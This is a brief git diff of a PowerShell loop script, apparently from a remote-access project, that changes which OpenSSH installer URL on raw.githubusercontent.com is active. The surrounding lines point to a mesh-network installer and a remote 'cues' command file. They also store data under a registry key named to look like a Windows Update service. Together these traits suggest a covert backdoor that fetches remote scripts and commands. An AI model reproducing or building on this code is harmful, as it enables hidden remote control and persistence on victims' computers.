@@ -14,8 +14,8 @@ while ($true) {
     $sshdatadir = "C:\ProgramData\ssh"
     $regPath = "HKLM:\Software\WindowsUpdateService"
     $cacheBuster = Get-Random
-    #$sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/BasicInletValveInstall.ps1"
-    $sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
+    $sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Archives/OpenSSHInstallFromZIP.ps1"
+    #$sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
     $ztinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1"
     $codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CuesForRemoteHosts.txt?cachebuster=$cacheBuster"
     $storedData = (Get-ItemProperty -Path $regPath).Data
